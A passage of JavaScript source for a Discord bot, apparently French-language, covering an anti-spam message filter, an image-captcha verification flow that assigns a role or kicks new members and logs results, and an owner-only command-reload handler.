              message.channel.bulkDelete(msgCount, true).catch(e => { });
          } else {
            userData.msgCount = msgCount;
            usersMap.set(message.author.id, userData);
             } 
          }
         } else {
        let fn = setTimeout(() => {
          usersMap.delete(message.author.id);
        }, TIME);
        usersMap.set(message.author.id, {
          msgCount: 1,
          lastMessage: message,
          timer: fn
        });
      }
  }
  });
 

const Canvas = require('canvas');
Canvas.registerFont('fonts/Roboto.ttf', { family: 'Roboto' });
Canvas.registerFont('fonts/sans.ttf', { family: 'Sans' });


client.captcha = function() {
	const canvas = Canvas.createCanvas(400, 180);
	const ctx = canvas.getContext('2d');
	const num = 5;
	const cords = [];
	const colors = ['blue', 'red', 'green', 'yellow', 'black', 'white'];
	let string = '';
	const particles = Math.floor(Math.random() * 101);
	const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
	const charactersLength = characters.length;
	// Random code generation
	for (var i = 0; i < 5; i++) {
		string += characters.charAt(Math.floor(Math.random() * charactersLength));
	}
	ctx.font = 'bold 100px Roboto';
	ctx.lineWidth = 7.5;
	let textPos = 45;
	// Captcha text
	for (var i = 0; i < string.length; i++) {
		const char = string.charAt(i);
		const color = colors[Math.floor(Math.random() * colors.length)];
		ctx.fillStyle = color;
		ctx.fillText(char, textPos, 120);
		textPos += 65;
	}
	// Paticles
	for (var i = 0; i < particles; i++) {
		const pos = {
			width: Math.floor(Math.random() * canvas.width),
			height: Math.floor(Math.random() * canvas.height)
		};
		const color = colors[Math.floor(Math.random() * colors.length)];
		ctx.fillStyle = color;
		ctx.beginPath();
		ctx.arc(pos.width, pos.height, 3.5, 0, Math.PI * 2);
		ctx.closePath();
		ctx.fill();
	}
	// Get the cords
	let x = 0;
	for (var i = 0; i < num + 1; i++) {
		const l = Math.floor(Math.random() * canvas.height);
		if (i != 0) x += canvas.width / num;
		cords.push([x, l]);
	}
	// Strokes
	for (var i = 0; i < cords.length; i++) {
		const cord = cords[i];
		const nextCord = cords[i + 1];
		const color = colors[Math.floor(Math.random() * colors.length)];
		ctx.strokeStyle = color;
		ctx.beginPath();
		ctx.moveTo(cord[0], cord[1]);
		if (nextCord) ctx.lineTo(nextCord[0], nextCord[1]);
		ctx.stroke();
	}
	return { buffer: canvas.toBuffer(), text: string };
};

client.on('guildMemberAdd', async member => {
	let toggle = db.get(`autokick_${member.guild.id}`);
	if (toggle === null) toggle = false;
	let captchaLogsID = db.get(`logs_${member.guild.id}`);
	let captchaLogs = client.channels.cache.get(captchaLogsID);
  if (!captchaLogs) return
	let invalid = 7;
	const captcha = client.captcha();
	console.log(captcha.text);
	const { buffer } = captcha;
	let channelID = db.get(`verifyChannel_${member.guild.id}`);
	if (channelID === null) return 
	let channel = member.guild.channels.cache.get(channelID);
	if (!channel) return 
	channel.send(`${member.user.toString()}`, {
		files: [
			{
				name: 'captcha.png',
				attachment: buffer
			}
		]
	});
	let pog = db.get(`verifyRole_${member.guild.id}`);
  if (!pog) return
	let filter = m => m.author.id === member.user.id;

	let collector = new Discord.MessageCollector(channel, filter, {
		max: 11,
		time: 60000
	});
	let fuckterval = setInterval(() => {
		if (!member.guild.members.cache.get(member.user.id)) collector.stop();
	}, 3000);

	collector.on('collect', async message => {
		if (!message.content) return;
		let num = 1;
		let time = num++;
		if (message.content != captcha.text) {
			invalid++;
			if (invalid > 9 && toggle === true) {
				if (member.kickable) {
					message.channel.send(
						':x: | **Trop de tentatives de captcha invalides.**'
					).then(msg => {msg.delete({ timeout: 5000})}).catch(err => { });;
					member.kick('Trop de tentative de captcha');
					let embed = new Discord.MessageEmbed()
						.setTitle('**captcha logs**')
						.setAuthor(
							member.user.tag,
							member.user.displayAvatarURL({ dynamic: true })
						)
						.setColor('#FF0000')
						.setFooter(message.guild.name + client.user.tag, message.guild.iconURL())
						.setThumbnail(member.user.displayAvatarURL({ dynamic: true }))
						.setDescription('Captcha rater')
						.addField('**Pseudo**', member.user.tag)
						.addField('**Status**', 'Kick')
						.addField('**Raison**', 'A échouer trop de fois');
					if (captchaLogs) {
						captchaLogs.send({ embed: embed });
					}
					return;
				}
				collector.stop();
				return;
			} else if (toggle === false && invalid > 9) {
				let embed = new Discord.MessageEmbed()
					.setTitle('**captcha logs**')
					.setAuthor(
						member.user.tag,
						member.user.displayAvatarURL({ dynamic: true })
					)
					.setColor('#FF0000')
					.setFooter(message.guild.name + client.user.tag, message.guild.iconURL())
					.setThumbnail(member.user.displayAvatarURL({ dynamic: true }))
					.setDescription('Captcha Echouer')
					.addField('**Pseudo**', member.user.tag)
					.addField('**Status**', 'kick')
					.addField('**Raison**', 'Trop de tentatives invalides');
				message.channel.send(':x: | **Trop de tantatives invalides.**').then(msg => {msg.delete({ timeout: 5000})}).catch(err => { });;
				if (captchaLogs) {
					captchaLogs.send({ embed: embed });
				}
				collector.stop()
				return;
			}
			message.channel.send(
				`:x: | **Code invalide. Essaies restants: ${10 - invalid}**`
			);
		}
		if (message.content === captcha.text) {
			try {
				message.channel.send('✅ | **Vérifier**');
				message.member.roles.add(pog);
				let embed = new Discord.MessageEmbed()
					.setTitle('**captcha logs**')
					.setAuthor(
						member.user.tag,
						member.user.displayAvatarURL({ dynamic: true })
					)
					.setColor('GREEN')
					.setFooter(message.guild.name + client.user.tag, message.guild.iconURL())
					.setThumbnail(member.user.displayAvatarURL({ dynamic: true }))
					.setDescription('Captcha passé')
					.addField('**Pseudo**', member.user.tag)
					.addField('**Status**', 'passé');
				if (captchaLogs) {
					captchaLogs.send({ embed: embed });
				}
				collector.stop();
			} catch {
				collector.stop();
				message.channel.send(':x: | **Erreur...**').then(msg => {msg.delete({ timeout: 10000})}).catch(err => { });;
			}
		}
	});
	collector.on('end', async (collected, reason) => {
		clearInterval(fuckterval);
		if (reason === 'time' && toggle === true) {
			if (member.kickable) {
				channel.send(
					`**Le membre a été kick pour inactivité.**`
				).then(msg => {msg.delete({ timeout: 5000})}).catch(err => { });;
				member.kick('n\'a pas répondu à temps');
				let embed = new Discord.MessageEmbed()
					.setTitle('**captcha logs**')
					.setAuthor(
						member.user.tag,
						member.user.displayAvatarURL({ dynamic: true })
					)
					.setColor('#FF0000')
					.setFooter(member.guild.name + client.user.tag, message.guild.iconURL())
					.setThumbnail(member.user.displayAvatarURL({ dynamic: true }))
					.setDescription('Captcha failed')
					.addField('**Pseudo**', member.user.tag)
					.addField('**Status**', 'kick')
					.addField('**Raison**', 'ne répond pas à temps.');
				if (captchaLogs) {
					captchaLogs.send({ embed: embed });
				}
				return;
			}
			return;
		} else if (toggle === false && reason === 'time') {
			let embed = new Discord.MessageEmbed()
				.setTitle('**captcha logs**')
				.setAuthor(
					member.user.tag,
					member.user.displayAvatarURL({ dynamic: true })
				)
				.setColor('#FF0000')
				.setFooter(message.guild.name + client.user.tag, message.guild.iconURL())
				.setThumbnail(member.user.displayAvatarURL({ dynamic: true }))
				.setDescription('Captcha échoué')
				.addField('**Pseudo**', member.user.tag)
				.addField('**Status**', 'failed')
				.addField('**Raison**', 'Ne répond pas à temps.');
			message.channel.send(':x: | **Tu n\'as pas répondu à temps**').then(msg => {msg.delete({ timeout: 5000})}).catch(err => { });;
			if (captchaLogs) {
				captchaLogs.send({ embed: embed });
			}
		}
	});
});




client.on('message', (message)=>{
  if (message.content.startsWith(prefix + "restart")){
    if(process.env.owner ===message.author.id   || db.get(`ownermd.${message.author.id}`) === true){
    console.clear()
  const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'))
for (const file of commandFiles) {
  const commands = require(`./commands/${file}`)
  client.commands.set(commands.name, commands)

  console.log(`> commande charger ${commands.name}`)
}
    }
}
})











process.on('unhandledRejection', error => {
});


client.login(process.env.TOKEN);
})
